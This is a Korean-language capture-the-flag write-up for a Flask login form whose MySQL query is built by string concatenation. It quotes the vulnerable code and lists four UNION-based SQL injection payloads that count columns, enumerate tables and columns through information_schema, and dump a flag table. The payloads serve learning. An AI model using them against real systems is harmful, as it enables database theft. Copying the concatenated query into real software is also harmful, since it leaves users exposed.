---
tier: "\bSilver 4"
topics:
  - SQL Injection
  - MySQL
solved-with: Self
---
### 문제 구조

로그인 창에서 아이디와 비밀번호를 입력 후 POST 요청을 보냄. 

``` python
# ...
    if request.method == "POST":
        uid = request.form.get('uid', '')
        upw = request.form.get('upw', '')
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)
# ...
```

**SQL 쿼리를 문자열의 결합으로 생성**하는데 이런 경우 SQL 인젝션에 취약함. 
그 후 `fetchall()`로 쿼리를 날리고 응답으로 오는 모든 데이터를 `data`에 담음. 
`user.html`에서는 `data`를 반복문 돌려서 화면에 보여줌. 

### 분석 및 풀이

0. UNION 컬럼 개수 확인
``` sql
admin' UNION SELECT null, null, null, null;--
```

1. 모든 테이블 정보 가져오기
``` sql
admin' UNION SELECT TABLE_NAME, null, null, null FROM information_schema.tables;--
```

2. onlyflag 테이블의 컬럼 이름 가져오기
``` sql
admin' UNION SELECT COLUMN_NAME, null, null, null FROM information_schema.columns WHERE table_name = 'onlyflag';--
```

3. onlyflag 컬럼 이름을 기반으로 데이터 가져오기 (`CONCAT` 이용)
``` sql
admin' UNION SELECT CONCAT(idx, sname, svalue, sflag, sclose), null, null, null FROM onlyflag;--
```

MySQL
- 주석: `--`, `#`
- `UNION`: 컬럼 개수가 앞에 날아가는 쿼리랑 동일해야함. 이 문제에서는 4개였기 때문에 4개를 맞추기 위해서 null을 사용함. 

